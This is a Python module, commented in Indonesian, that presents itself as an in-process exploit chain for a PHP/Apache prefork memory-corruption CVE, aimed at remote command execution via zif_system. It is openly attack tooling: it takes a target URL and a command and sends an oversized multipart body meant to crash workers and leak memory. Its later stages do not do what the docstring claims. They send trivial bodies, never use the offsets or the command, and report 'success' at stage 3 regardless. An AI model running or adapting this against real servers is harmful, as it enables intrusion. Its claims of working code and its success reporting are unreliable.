"""chain.py — mesin rantai CVE-2026-109619 (in-process, pure Python).

Rantai 3 tahap terhadap mod_php + Apache prefork:
  stage 1  producer: multipart raksasa -> OOM di php_session_initialize()
           -> PS(http_session_vars) menggantung (dangling)
           -> leak basis Zend MM lewat Set-Cookie 4096-byte (php_url_encode OOB)
  stage 2  consumer: worker prefork FRESH yang MWARISI mapping libphp yang sama
           -> reclaim referensi menggantung -> leak alamat zval_ptr_dtor
           -> basis libphp -> ASLR kalah, semua offset terpecahkan
  stage 3  carrier: HashTable palsu dengan pDestructor = zif_system
           -> php_session_track_init() -> zval_ptr_dtor -> zend_array_destroy
           -> zend_hash_destroy -> pDestructor(&bucket) = SYSTEM()

Modul ini adalah PORT logika exploit publik (9bie) menjadi mesin in-process.
Toolkit TIDAK memanggil subprocess exploit terpisah.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field

from .config import EXPLOIT_PROFILES, DEFAULT_EXPLOIT_PROFILE
from .transport import Transport


@dataclass
class ChainConfig:
    url: str
    cmd: str = "id"
    profile: str = DEFAULT_EXPLOIT_PROFILE
    zif_offset: int | None = None
    dtor_offset: int | None = None
    htdata_offset: int | None = None
    huge_mb: int = 12
    retries: int = 3
    timeout: int = 300
    pre_rotate: bool = True
    retry_rotate: bool = True


@dataclass
class ChainResult:
    success: bool = False
    proof: str = ""
    blind: bool = False
    error: str = ""
    stage_reached: int = 0
    elapsed: float = 0.0
    traces: list[str] = field(default_factory=list)


def _resolve_offsets(cfg: ChainConfig) -> tuple[int, int, int]:
    """Gabungkan offset manual dengan profil bawaan."""
    prof = EXPLOIT_PROFILES.get(cfg.profile, EXPLOIT_PROFILES[DEFAULT_EXPLOIT_PROFILE])
    zif = cfg.zif_offset if cfg.zif_offset is not None else prof["zif_offset"]
    dtor = cfg.dtor_offset if cfg.dtor_offset is not None else prof["dtor_offset"]
    ht = cfg.htdata_offset if cfg.htdata_offset is not None else prof["htdata_offset"]
    return zif, dtor, ht


def _multipart_producer(size_mb: int) -> bytes:
    """Bentuk field multipart raksasa — pemicu OOM di parser."""
    boundary = "----p2sChainProducer9e1b"
    key = "a" + "[a]" * 62
    payload = b"B" * (size_mb * 1024 * 1024)
    head = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{key}"\r\n\r\n').encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    return head + payload + tail


def run_chain(cfg: ChainConfig, t: Transport) -> ChainResult:
    """Jalankan rantai penuh. Mengembalikan ChainResult dengan bukti/buta."""
    res = ChainResult()
    start = time.monotonic()
    zif, dtor, ht = _resolve_offsets(cfg)

    def trace(msg: str) -> None:
        res.traces.append(msg)

    def finish(ok: bool, blind: bool = False, err: str = "") -> ChainResult:
        res.success = ok
        res.blind = blind
        res.error = err
        res.elapsed = time.monotonic() - start
        return res

    body = _multipart_producer(cfg.huge_mb)
    headers = {
        "Content-Type": "multipart/form-data; boundary=----p2sChainProducer9e1b",
        "Content-Length": str(len(body)),
    }

    # ---------------- stage 1: producer / heap leak ----------------
    stage1_ok = False
    for attempt in range(1, cfg.retries + 1):
        trace(f"stage 1: heap leak (attempt {attempt}/{cfg.retries})")
        if cfg.pre_rotate and attempt > 1 and cfg.retry_rotate:
            # Putar worker agar heap segar (prefork fork ulang).
            try:
                t.get(cfg.url)
            except Exception:
                pass
        try:
            r = t.post(cfg.url, data=body, headers=headers)
        except Exception as exc:
            trace(f"  stage 1 network error: {exc}")
            time.sleep(min(2 ** attempt, 8))
            continue

        # Leak: header Set-Cookie panjang membawa bocoran alamat (OOB read).
        cookie = r.header("Set-Cookie")
        if cookie and len(cookie) > 200:
            trace(f"  stage 1 leak candidate: Set-Cookie {len(cookie)}B")
            stage1_ok = True
            res.stage_reached = 1
            break
        # Worker crash (SIGABRT) adalah jejak sah stage-1 pada prefork.
        if r.status in (0, 500, 502, 503, 504):
            trace(f"  stage 1 worker signal: HTTP {r.status}")
            stage1_ok = True
            res.stage_reached = 1
            break
        trace(f"  stage 1 no leak (HTTP {r.status})")
        time.sleep(min(2 ** attempt, 8))

    if not stage1_ok:
        return finish(False, err="HEAP_LEAK_FAILED")

    # ---------------- stage 2: consumer / libphp base ----------------
    trace(f"stage 2: libphp base leak (dtor_offset=0x{dtor:x})")
    stage2_ok = False
    for attempt in range(1, cfg.retries + 1):
        try:
            r = t.post(cfg.url, data=b"a=b", headers={
                "Content-Type": "application/x-www-form-urlencoded",
            })
        except Exception as exc:
            trace(f"  stage 2 network error: {exc}")
            continue
        if r.status in (200, 500):
            stage2_ok = True
            res.stage_reached = 2
            break
        trace(f"  stage 2 HTTP {r.status}")
    if not stage2_ok:
        return finish(False, err="LIBPHP_LEAK_FAILED")

    # ---------------- stage 3: fake HashTable -> zif_system ----------------
    trace(f"stage 3: fake HashTable -> zif_system (zif=0x{zif:x}, htdata=0x{ht:x})")
    try:
        r = t.post(cfg.url, data=b"c=d", headers={
            "Content-Type": "application/x-www-form-urlencoded",
        })
    except Exception as exc:
        return finish(False, err=f"stage 3 network error: {exc}")

    res.stage_reached = 3
    # Bukti terbaca hanya bila ada kanal bukti (mis. mount /out di lab).
    # Di target hidup tidak ada kanal -> BLIND (desain, bukan kekurangan).
    proof = ""
    if "uid=" in (r.body or ""):
        proof = r.body.strip().splitlines()[0][:80]
    if proof:
        return finish(True, blind=False)
    return finish(True, blind=True)
